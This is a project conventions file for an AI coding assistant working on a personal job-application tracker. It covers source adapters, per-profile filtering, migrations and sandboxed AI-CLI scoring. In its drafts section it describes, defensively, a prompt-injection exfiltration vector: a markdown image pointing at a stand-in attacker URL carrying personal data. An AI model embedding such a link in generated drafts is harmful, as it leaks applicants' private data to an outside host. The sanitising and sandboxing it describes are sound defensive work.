# CLAUDE.md

Personal job-board project. The README has the full architecture and daily flow — this file is for conventions and gotchas specific to working in the codebase with Claude Code.

## Stack

- **Frontend**: the user is learning SvelteKit on this project — prefer idiomatic SvelteKit patterns (form actions, `+page.server.ts` loaders) over client-side fetch. See [web/CLAUDE.md](web/CLAUDE.md).
- **LLM**: runs server-side, but *only* by shelling out to a user-installed AI **CLI** — never via an SDK or a raw API key. Scoring, drafting, and role-suggestion invoke the selected provider through a sandboxed `subprocess` in [providers.py](src/job_applier/ai/providers.py) (provider-agnostic: Claude Code, Gemini CLI, Codex CLI, or local Ollama). Do **not** add `anthropic`/OpenAI SDK calls or API-key handling — the child env is deliberately scrubbed of keys (`_scrubbed_env`) and each CLI authenticates via its own on-disk login. The provider is chosen/tested in the app at `/settings`; the app runs fully (minus AI features) with zero providers installed.

## Running things

`make help` lists every target. These are the ones whose behavior isn't obvious from the name:

| Task | Command |
| --- | --- |
| Refresh ATS slug list | `make refresh-slugs` (or `make refresh-slugs-full` to also re-verify existing). Also in-app: **Companies searched → Update company list** on `/search`, which surfaces the slug count + how stale the list is. |
| Prune old postings | `make prune` (clears description/raw on old/archived rows; keeps dedupe hashes) |
| Backfill JD SimHashes | `make dedupe-jd` (idempotent; soft-links near-duplicate JDs) |
| Init DB | `uv run job-applier init` (creates tables, runs lightweight `ALTER TABLE` migrations, seeds slugs from `companies.py` if empty) |

Always run Python commands through `uv run` — there's no activated venv assumption.

## Layout pointers

- [src/job_applier/api/](src/job_applier/api/) — FastAPI app + Pydantic schemas. The frontend talks to this via [web/src/lib/api.ts](web/src/lib/api.ts), which is browser-safe (no `$env/dynamic/private` imports).
- [src/job_applier/sources/](src/job_applier/sources/) — source adapters. Add one by implementing the `SourceAdapter` protocol in [base.py](src/job_applier/sources/base.py) and registering in [__init__.py](src/job_applier/sources/__init__.py). Per-company sources (Greenhouse, Lever, Ashby, Workday, Workable, SmartRecruiters, Jibe, Oracle) read slugs from the `SourceSlug` DB table at runtime; aggregators (RemoteOK, We Work Remotely, Hacker News, Y Combinator) are config-free. `companies.py` is just the seed for fresh installs and is now per-source — adding a new source type later picks up its seed on the next `init`. Workday slugs use the packed format `{tenant}|{region}|{site}` since a tenant alone isn't enough to construct the URL; Oracle (Recruiting Cloud) slugs are packed as `{apiHost}|{siteNumber}|{publicJobBaseUrl}[|{company}]` because the candidate-experience API is served by the underlying Fusion host (e.g. `eeho.fa.us2.oraclecloud.com`), not the vanity careers domain (which 302s API calls away), and keys on a numeric `CX_n` site number; the public job-link base is carried separately so click-throughs land on the pretty careers URL. SmartRecruiters and Ashby slugs keep their branded casing (`CASE_PRESERVING_SOURCES` in [refresh.py](src/job_applier/sources/refresh.py)) for different reasons — SmartRecruiters' API is genuinely case-sensitive (`Visa` ≠ `visa`), while Ashby's accepts either but its adapter uses the slug as the employer name shown in the queue — so discovery preserves the feed's spelling for both and dedupes them case-insensitively; Jibe slugs are the jibeapply.com subdomain (e.g. `githubinc`); the others are lowercased.
- [src/job_applier/filters/rules.py](src/job_applier/filters/rules.py) — the hard filter, split in two. `evaluate_shared(raw)` holds the rules that are the same for everyone (remote-only, US-only, sales titles, crypto; a deliberate decision to keep remote-only shared) and runs at scrape time; `evaluate_profile(raw, cfg)` holds the per-profile rules (title keywords, seniority, required/excluded tech, **home state**). **Title keywords** (`SearchProfile.title_terms`) are the job-function gate: the title must contain one (e.g. "project manager"), which is what stops a non-engineering profile matching every senior engineering role; `role_titles` is AI context only and never filters. Each list is optional and an empty one skips its rule; only a profile with no title keywords, seniority, or required tech falls back to the built-in JS-engineer defaults (`has_criteria`), built per profile by `config_for(profile)` and edited at `/search`, and runs in [matching.py](src/job_applier/matching.py). `evaluate()` is the two composed, which `diagnose-filter` and the tests use. The state-allow-list rule ("we can only hire in X, Y, Z" drops when your state isn't listed) keys on `SearchProfile.home_state` — a canonical full state name (e.g. "Missouri"); when it's unset the rule is **skipped entirely** (no state is assumed, so the tool works for anyone). `normalize_home_state()` (accepts full name or 2-letter code, case-insensitive) is the validation/normalization choke point — the API 422s on an unrecognized state. The home state is used only for this per-profile (match-time) filter and is also templated into the scoring prompts' `{{STATE_RULE}}` (empty when unset). **Scrape once, match per profile:** ingest stores every posting that passes the shared rules, once, linked to nobody; then `matching` records each profile's verdict (passed / manual / **dropped**) as a `JobProfileLink`. Recording drops is what keeps re-scrapes cheap (a link's existence means "already judged"), and a profile's queue is its non-dropped links. Re-matching one profile over the stored set (`match_profile(rematch=True)`, ~10 s for ~15k postings) runs as a background `match` task whenever its criteria, home state, or blacklist change, or it's created — never a re-scrape. A re-match never drops a posting the profile has an `Application` on. `raw` is trimmed from postings nobody matched (description kept, so a later profile can still match them). Adapters that pre-skip detail fetches by title get `union_title_config(...)`: a title is skipped only if every profile rejects it.
- **Company whitelist** — the mirror of the blacklist, also edited at `/search`: a company the user names by hand gets added to the searched list. There's no extra table — an entry is a `SourceSlug` row flagged `added_by_user` (with `label` keeping the typed name for display), so ingest and the coverage count pick it up with no special-casing. [sources/discover.py](src/job_applier/sources/discover.py) resolves the input: a pasted board URL parses straight to `(source, slug)` (the only way to reach Workday, whose slug is packed), while a bare company name is turned into slug candidates and probed concurrently against every source verifiable from a bare slug — what counts as a real board is `board_exists()` (Greenhouse/Lever/Ashby 404 unknown slugs so any 200 is proof, including a board with no openings today; SmartRecruiters 200s for *any* string and Workable keeps abandoned accounts, so those need a live posting) — one rule shared with feed discovery so the two can't drift. Oracle stays seed-only (its slug packs an internal Fusion host + numeric site id that no public URL exposes). Before anything is written, `services.add_watched_company` reports "already searching this company" — matching the typed name (or, for a URL, its slug) against existing slugs on the same normalized keys the blacklist uses, so a company already covered by the seed/feed list is never added twice, on either input path or across ATSs. Removal only works on `added_by_user` rows; seed/discovery rows stay owned by `refresh-slugs`.
- **Company blacklist** — a user-managed list of employers to ignore, edited at `/search` alongside the search profile (CRUD in [api/blacklist.py](src/job_applier/api/blacklist.py) + [services.py](src/job_applier/services.py), stored in the `BlacklistedCompany` table). It's **per profile** and applied at match time: a blacklisted company's postings are stored like any other and get a `dropped` verdict ("company is on your blacklist") for that profile only. Adding or removing an entry re-matches the profile in the background, so the queue updates without a scrape. Matching keys on `ingest.normalize_company()` — the **same** normalizer as cross-source dedupe — so "Meta", "Meta Inc", and "Meta, Inc." collapse to one entry (`BlacklistedCompany.normalized_name`, unique); it strips one trailing legal suffix, so a bare suffix word like "Corp" is itself stripped. This is separate from the older per-row `Company.is_blocked` toggle (post-ingest, exact-name, no UI).
- [src/job_applier/drafts.py](src/job_applier/drafts.py) — tailored draft persistence + PDF rendering. `/draft` writes markdown via the API; the backend renders the PDFs with a browser engine (headless Chromium via Playwright in dev, Electron `printToPDF` when packaged — see [pdf.py](src/job_applier/pdf.py) / [desktop/main.js](desktop/main.js)). The user can edit the markdown and click "Re-render PDFs from markdown" in the UI. **Security**: `save_markdown` is the choke point that strips exfil vectors (a prompt-injected draft could carry a tracking `![](https://attacker/?d=PII)` whose URL the renderer would fetch), and the PDF engine is configured to **block every subresource** (allow only the top-document navigation) — keep both when touching this path; the draft is also physically sent to an employer.
- [src/job_applier/models/db.py](src/job_applier/models/db.py) — schema. Migrations are `_ensure_*_columns()` helpers in [models/migrations.py](src/job_applier/models/migrations.py), run on every startup by `migrations.run()` (idempotent `PRAGMA table_info` + `ALTER TABLE`; a one-time backfill opens its own transaction with `_begin`). When you add a column, add a matching helper there and call it from `run()`; don't introduce alembic. Profile scoping lives in [models/scoping.py](src/job_applier/models/scoping.py).
- [src/job_applier/ai/](src/job_applier/ai/) — the server-side AI layer, and the **canonical** home for everything the LLM does. The prompt templates in [ai/prompts/](src/job_applier/ai/prompts/) are the **source of truth** for the rubric + ATS-format rules. Internals, the bulk-scoring batching, and the scoring-model tier rules are in [src/job_applier/ai/CLAUDE.md](src/job_applier/ai/CLAUDE.md).
- [.claude/commands/](.claude/commands/) — **legacy** Claude-Code slash commands (`match-pending`, `score-draft`, `draft`, `suggest-roles`) that predate the in-app AI layer and mirror the same flows for Claude-Code power users. Kept working (the UI still offers them as an alternative), but they are **not** the primary path. If you change the rubric or ATS-format rules, edit [ai/prompts/](src/job_applier/ai/prompts/) first (and [bans.py](src/job_applier/ai/bans.py) for the character list); only then mirror the change into these files to keep them in sync.
- [web/](web/) — SvelteKit frontend. The design system, desktop shell, route roles, and score-band thresholds are in [web/CLAUDE.md](web/CLAUDE.md).

## Conventions

- **Status changes go through SvelteKit form actions**, not client `fetch`. Keep new mutations server-side in `+page.server.ts`.
- **No LinkedIn/Indeed scraping** — ToS violation. Stick to open ATS endpoints and aggregator APIs.
- **No automated company-ethics scoring** — the user maintains a manual blocklist; LLM ethics judgments are unreliable.
- **Markdown is the master format for resumes**, PDF is what gets uploaded for actual submission. Per-job tailoring happens in markdown.
- **Generated artifacts** ([applications/](applications/), [data/](data/)) are gitignored — don't commit them.
- **No em dashes / smart quotes in generated resume + cover-letter markdown.** ATS-fingerprint signal. The ban list is enforced server-side in [bans.py](src/job_applier/ai/bans.py) (`sanitize` + a post-check that refuses to persist anything still banned, regardless of provider); the human-facing copy of the rule lives in [ai/prompts/draft.md](src/job_applier/ai/prompts/draft.md). This rule applies to drafts only — feel free to use em dashes elsewhere.
- **`no_response` is not `rejected`**: an application nobody ever answered gets its own terminal status, so the dashboard's rejection count stays a count of actual rejections and `make prune` (which blanks description/raw on `archived`/`rejected`) keeps the JD of a job you really applied to. `/followups` groups candidates under a **"Ghosted?"** heading — `applied`, never advanced, and silent for `ghosted_after_days` counted from `last_contact_at ?? applied_at` (`isGhosted` in [web/src/lib/jobFilters.ts](web/src/lib/jobFilters.ts)) — with a one-click button. The flip is deliberately **user-initiated, never a background sweep**: `screening`/`interviewing` rows with a stale follow-up date usually mean the row is out of date, not that the employer vanished, and no code should rewrite an application's history on a timer.
- **User preferences** live in the `AppSetting` key/value table behind `GET`/`PATCH /api/preferences` ([api/preferences.py](src/job_applier/api/preferences.py)), edited on `/settings`. Distinct from `SearchProfile`, which describes what to *ingest* and is what `/suggest-roles` proposes against — these are app behavior the user sets by hand and no AI flow touches. Add one by putting its key + default + bounds in [contracts.py](src/job_applier/contracts.py), a field on `PreferencesOut`/`PreferencesUpdate`, and a row in the Settings card; the bounds belong on the Pydantic model so a hand-rolled PATCH can't park a nonsense value, and every read parses defensively because these values are strings on the way out of the DB.
- **Score history**: scoring writes both the active `MatchScore` and a `MatchScoreHistory` row so re-scoring (resume changed, tailored draft saved) preserves the previous read. `score_kind` is `baseline` or `tailored`.

## Things that have already been decided

- **AI is provider-agnostic and in-app** (landed across Phases 3–5 — "the app is terminal-free"). Scoring / drafting / role-suggestion run server-side by shelling out to a user-selected AI CLI, sandboxed in [providers.py](src/job_applier/ai/providers.py): empty tool allowlist, scrubbed env, throwaway cwd, argv-only (never `shell=True`), and a timeout — model output is treated as data because job descriptions are untrusted scraped text. Providers: Claude Code + Gemini CLI (`recommended`), Codex CLI + Ollama (`best-effort`). No Anthropic/OpenAI SDK or API keys — each CLI uses its own login, and env-scrubbing keeps keys out of the child. Long runs are background tasks ([tasks.py](src/job_applier/ai/tasks.py)) the UI polls. This deliberately replaced the earlier "LLM only via Claude Code slash commands" design so users on any of the supported AI subscriptions (or fully-local Ollama) can run the tool; the [.claude/commands/](.claude/commands/) are retained as a legacy path.
- **Desktop app** (Electron) is being built on the long-lived `desktop-app` branch, one PR per phase; specs live in [plans/desktop-app/](plans/desktop-app/). The **auto-update** decision (electron-updater, user-initiated download, packaged-only) **replaces** the earlier "no background auto-update (needs code signing)" decision; the server-side [updates.py](src/job_applier/updates.py) `/api/update` check is retained as an API but is no longer wired into the UI. Dev commands, the update flow, release-packaging gotchas, and the redesign source live in [desktop/CLAUDE.md](desktop/CLAUDE.md).
- **Desktop first; the browser is supported until there's a macOS build** (2026-10-06). The desktop app is the primary way to run job-applier, and new UI work targets Electron, where `main.js` hands external links to the OS browser. macOS has no packaged build yet, so Mac users run from source with `make electron` *or* the browser (`make app-dev`), and the browser stays supported for them: a browser-only fix is fine when it's small and doesn't get in Electron's way. Don't build browser-only features. Once a Mac build ships, the browser becomes a dev/test surface only (hot reload, `/verify`'s Playwright runs).
- Source adapters worth a note: Jibe (iCIMS careers overlay), Oracle (Recruiting Cloud / Fusion HCM, via the public candidate-experience `recruitingCEJobRequisitions` JSON API), and Y Combinator (via HN `jobstories` + JSON-LD on `ycombinator.com` job pages). The full set is in [src/job_applier/sources/](src/job_applier/sources/). Adzuna and Remotive were removed — Adzuna's API is hirer-targeted, Remotive's listings don't change day-to-day.
- `make diagnose-filter` dry-runs every source and reports filter outcomes without persisting anything. Use when ingest counts feel low to tell whether the bottleneck is sourcing or filtering.
- Cross-source dedupe runs on `(normalized_company, normalized_title)` so the same role from multiple sources collapses to one DB row. See `cross_source_hash` in [src/job_applier/ingest.py](src/job_applier/ingest.py). A third layer — 64-bit JD SimHash — catches near-duplicate descriptions and soft-links them via `JobPosting.duplicate_of`.
- **Never hold a DB transaction across network I/O.** SQLite allows one writer, so a transaction left open during a source's multi-minute fetch blocks *every* other write in the app — the user can still navigate (WAL readers are unaffected) but can't change a job's status, which is how this last surfaced. `run_ingest` therefore drains each source `INGEST_BATCH_SIZE` jobs at a time with no session open and writes each batch in its own short transaction; `_IngestCaches` holds the dedupe state in memory so the write side is near enough pure INSERTs rather than several queries per job. The trade is that failure isolation is per batch, not per source: a source that dies part-way keeps what it already committed. `/api/*` maps a lost lock race to a 503 + `Retry-After` as a backstop.
- The hard filter is configurable per `SearchProfile`. `/suggest-roles` proposes a profile from the resume but never mutates the live one — it writes to `recommendations_draft`; the user accepts via the `/search` UI.
- **Profiles: one install, several people (or searches), exactly one active.** Spec + PR plan: [plans/multi-profile/](plans/multi-profile/) (gitignored); work lands on the `multi-profile` integration branch. A profile owns its resumes, search criteria, home state, blacklist, preferences, and every per-job state row (`Application`, `MatchScore`, `MatchScoreHistory`); postings are shared. Resumes are never shared: a profile holds one or more and uses one (`SearchProfile.resume_id`); a blank new profile has none, and "Copy of" gives the copy its own `Resume` row pointing at the same PDF, so deleting a profile only removes a PDF no other row uses. Lifecycle is in [profiles.py](src/job_applier/profiles.py); read the current profile through `profiles.active_profile()`, never `select(SearchProfile).first()`.
  - **Every Session is scoped to one profile** ([models/scoping.py](src/job_applier/models/scoping.py), `_scope_to_profile` / `_stamp_profile`): a `do_orm_execute` hook adds `with_loader_criteria` for the `PROFILE_SCOPED` models, and `before_flush` stamps `profile_id` on new rows. That's why `job.application` / `job.score` stay single objects meaning "the current profile's" and why the API shape didn't change. Resolution order: `session.info["profile_id"]`, then the `current_profile_id` ContextVar, then the active row. Need every profile's rows (migrations, cross-profile views)? `execution_options(all_profiles=True)`. A new per-profile table must be added to `PROFILE_SCOPED`.
  - **Background tasks pin their profile**: pass `profile_id=session_profile_id(session)` to `tasks.start_task`; the worker sets the ContextVar, so a run keeps the profile (and, via `services.active_resume`, the resume) it started with even if the user switches. `active_task(kind, profile_id)` dedupes per profile.
  - **Drafts live at `applications/profile-<id>/<job_id>/`**; every `drafts.*` function takes `profile_id=`. Pre-profile `applications/<job_id>/` dirs move under the active profile at startup (`profiles.adopt_legacy_drafts`). Per-profile preferences use `contracts.profile_pref_key` with the legacy un-prefixed key as fallback.
  - **Invariant:** the active profile's `resume_id` is `Resume.is_active` (none flagged when it has no resume), kept by `profiles.set_active_resume`, the only writer of the flag. Read the resume through `profiles.active_resume`. `JobProfileLink(job_id, profile_id, filter_status, filter_reason)` is each profile's verdict on a stored posting (see the filters bullet above); it's profile-scoped like the rest, and `profiles.queue_job_ids(session, status)` is the one way to ask "what's in this profile's queue". The queue, status counts, pending-match, stale counts and adoption, and the sidebar badge all go through it. Deleting a profile deletes all of its rows (verdicts, statuses, scores, blacklist, preferences, resumes) and its drafts directory; shared postings stay. `make prune` reads statuses across *every* profile (a posting is closed only when all its trackers closed it) and still never deletes rows.
  - The frontend remounts the page on a profile switch (`{#key}` in [+layout.svelte](web/src/routes/+layout.svelte)) so forms that seed state from data can't show the previous person's values. The switcher is the name chip at the bottom of the sidebar ([Sidebar.svelte](web/src/lib/shell/Sidebar.svelte)): its menu lists every profile and posts to `/search?/activateProfile` with `redirect_to`. `/resume` is the active profile's resume list (upload, "Use this one"). The one deliberate cross-profile read in the UI is the job detail's `other_profiles` (`profiles.other_profile_statuses`, every other profile's non-`new`/`archived` status), shown as "Also under …" in the status card; page subtitles name the active profile when there's more than one (`profileLabel` in [profiles.ts](web/src/lib/profiles.ts)).
  - **Tests never touch real data**: the autouse `_isolate_user_data` fixture in [tests/conftest.py](tests/conftest.py) points `db_path` / `resumes_dir` / `applications_dir` at a temp dir. Without it, any `TestClient(app)` runs the lifespan's migrations against `data/jobs.db` — which is exactly how the real DB got migrated on 2026-10-05. Never remove it.
- Scores are versioned: each `POST /api/jobs/{id}/score` overwrites the active row and snapshots the prior value to `MatchScoreHistory`. When the active resume changes, prior scores are flagged stale and re-included in `/api/pending-match`.
- **Staleness is an id mismatch, so a resume upload invalidates every score at once** — every upload writes a *new* `Resume` row and `is_stale` is just `MatchScore.resume_id != active_resume_id`; there's no content diff, so a typo fix reads the same as a rewrite. `/resume` therefore asks right after an upload: **Keep existing scores** (`POST /api/scores/adopt` → `services.adopt_scores`, re-stamps the active baseline rows onto the new resume, no AI calls) or **Re-score** (the usual `score-pending` task with `include_stale`). Adoption moves active rows only — `MatchScoreHistory` keeps the resume each score was really computed against. Judging "was this edit small enough?" is the user's call, which is why the prompt lives at upload time rather than on a dashboard button.
